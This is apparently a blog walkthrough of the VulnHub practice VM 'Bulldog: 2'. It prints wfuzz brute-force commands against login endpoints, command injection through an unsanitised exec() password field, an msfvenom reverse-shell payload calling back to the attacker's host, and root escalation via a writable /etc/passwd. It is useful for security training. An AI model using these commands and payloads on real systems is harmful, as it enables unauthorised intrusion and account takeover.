@@ -1,0 +1,194 @@
+
+
+The Reckoning
+
+
+
+
+
+
+
+
+Bernie Lim
+
+
+
+
+A security enthusiast. Likes cats.
+
+
+
+
+
+9 Aug 2018
+
+
+
+7 min read
+
+
+0 Comments
+
+
+
+
+
+This post documents the complete walkthrough of Bulldog: 2, a boot2root VM created by Nick Frichette, and hosted at VulnHub. If you are uncomfortable with spoilers, please stop reading now.
+
+Background
+Three years have passed since Bulldog Industries suffered severe data breaches. In that time, they have recovered and re-branded as Bulldog.social, an up and coming social media company. Can you take on this new challenge and get root on their production web server?
+Information Gathering
+Letâs start with a nmap scan to establish the available services in the host.
+# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.30.128
+...
+PORT   STATE SERVICE REASON         VERSION
+80/tcp open  http    syn-ack ttl 64 nginx 1.14.0 (Ubuntu)
+|_http-cors: HEAD GET POST PUT DELETE PATCH
+|_http-favicon: Unknown favicon MD5: B9AA7C338693424AAE99599BEC875B5F
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Bulldog.social
+
+Looks like only 80/tcp is open. Hereâs how the site looks like.
+
+Angular
+The site is running on Angular (4.4.7), at least the client-side of the site is. You can see the Angular favicon on the tab.
+
+Another way of determining if the site is running Angularâis by looking at the DOM tree. The DOM tree is dynamically built by Angular through the use of JavaScript (or TypeScript at the server side). Thereâs no point to looking at the HTML source because you wonât find anything useful there other than the bundled JavaScript files. Mind you, these minified files make analysis a little more difficult than usual, but you can always use the browserâs JavaScript debugger to prettify them.
+
+The login page is available to us as the sole attack surface, but where are the usernames?
+
+Turns out that thereâs a /users/getUsers route hidden in main.js.
+
+# curl -s 192.168.30.128/users/getUsers | jq . | grep username | cut -d':' -f2 | cut -d'"' -f1 &gt; usernames.txt
+# wc -l usernames.txt
+15760
+
+The site is not lying when they say they have over 15,000 users!
+Using wfuzz and a wordlist of the 100 most common passwords, we can attempt a brute-force at the login page like so.
+# wfuzz \
+-w usernames.txt \
+-w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt \
+-H "Content-Type: application/json" \
+-H "Referer: http://192.168.30.128/login" \
+-d "{\"username\":\"FUZZ\", \"password\": \"FUZ2Z\"}" \
+-t 20 \
+--hc 401 \
+http://192.168.30.128/users/authenticate
+
+In fact, we donât even have to finish the brute-force.
+********************************************************
+* Wfuzz 2.2.11 - The Web Fuzzer                        *
+********************************************************
+
+Target: http://192.168.30.128/users/authenticate
+Total requests: 1576000
+
+==================================================================
+ID	Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000206:  C=200      0 L	       3 W	    445 Ch	  "eivijay - 12345"
+000405:  C=200      0 L	       3 W	    459 Ch	  "ipadolpho - 123456789"
+000704:  C=200      0 L	       3 W	    454 Ch	  "mdrudie - qwerty"
+000916:  C=200      0 L	       3 W	    464 Ch	  "nmmyriam - letmein"
+001603:  C=200      0 L	       3 W	    447 Ch	  "nswash - 12345678"
+001801:  C=200      0 L	       3 W	    462 Ch	  "pejerrine - 123456"
+
+Logging in with any of the credentials above will result in a JSON Web Token (JWT) and the userâs profile getting stored in the browserâs local storage. Youâll see that in a while.
+Letâs go with the credential (eivijay:12345).
+
+Hereâs the local storage. The stored items are: id_token and user.
+
+Somewhere in main.js lies the function (aptly called isAdmin) to determine if a user is admin.
+
+A user is admin as long as the userâs authentication level is master_admin_user. Letâs change the authentication level for eivijay.
+
+Refreshing the profile page brings out the Admin Dashboard route.
+
+# wfuzz \
+-w /usr/share/wordlists/rockyou.txt \
+-H "Content-Type: application/json" \
+-H "Referer: http://192.168.30.128/dashboard" \
+-d "{\"username\":\"admin\", \"password\": \"FUZZ\"}" \
+-t 20 \
+--hh 40 \
+http://192.168.30.128/users/linkauthenticate
+********************************************************
+* Wfuzz 2.2.11 - The Web Fuzzer                        *
+********************************************************
+
+Target: http://192.168.30.128/users/linkauthenticate
+Total requests: 14344392
+
+==================================================================
+ID	Response   Lines      Word         Chars          Payload    
+==================================================================
+
+023194:  C=400     10 L	      60 W	   1061 Ch	  "!"Â£$%^"
+037686:  C=200      0 L	       2 W	     40 Ch	  "foreverfriends"^C
+Finishing pending requests...
+
+I wasted plenty of CPU cycles here trying to brute-force the second login. But, at least it brought me closer to the next stage. Notice when the password contains a double quote ("), the response code is 400 and the response length is more than 1000 bytes? This prompted me to investigate further.
+Using Burp Suite, I was able to reproduce the 400 response.
+
+Turns out that the JSON parser produces a syntax error when itâs given a malformed JSON input.
+
+Bulldog 2 - The Reckoning
+Not knowing how to proceed, I chanced upon the siteâs Github respository searching for âBulldog-2-The-Reckoningâ in Google.
+You can see what happens at the /linkauthenticate routeâthe password field is not sanitized before passing on to exec.
+user.js
+router.post('/linkauthenticate', (req, res, next) =&gt; {
+  const username = req.body.password;
+  const password = req.body.password;
+
+  exec(`linkplus -u ${username} -p ${password}`, (error, stdout, stderr) =&gt; {
+  if (error) {
+    console.error(`exec error: ${error}`);
+    return;
+  }
+  console.log(`stdout: ${stdout}`);
+  console.log(`stderr: ${stderr}`);
+});
+
+Low-Privilege Shell
+Armed with this knowledge, we can make use of command substitution to execute shell commands through the password field.
+First, letâs see if we can execute wget.
+
+Awesome. wget is available and itâs running 64-bit.
+
+# echo -n 7838365f36340a | xxd -p -r
+x86_64
+
+Next, generate a 64-bit reverse shell with msfvenom.
+# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.30.129 LPORT=4444 -f elf -o rev
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 74 bytes
+Final size of elf file: 194 bytes
+Saved as: rev
+
+Transfer the reverse shell over to /tmp/rev with wget.
+
+Make it executable with chmod +x /tmp/rev.
+
+Letâs execute the reverse shell.
+
+Boom. We got shell.
+
+Now that we have a low-privilege shell, letâs spawn a pseudo-tty with Python.
+
+Privilege Escalation
+I found my ticket to privilege escalation during enumeration of this account.
+
+Since we have write permissions to /etc/passwd, letâs change the root password to root.
+
+Whereâs the Flag (WTF)
+Getting the flag is trivial now that Iâm root.
+
+
+Afterthought
+Who would have thought that the MEAN stack is so cool? I certainly didnât know anything about it until I tried my hands on this VM. Kudos to Nick for creating it!
+
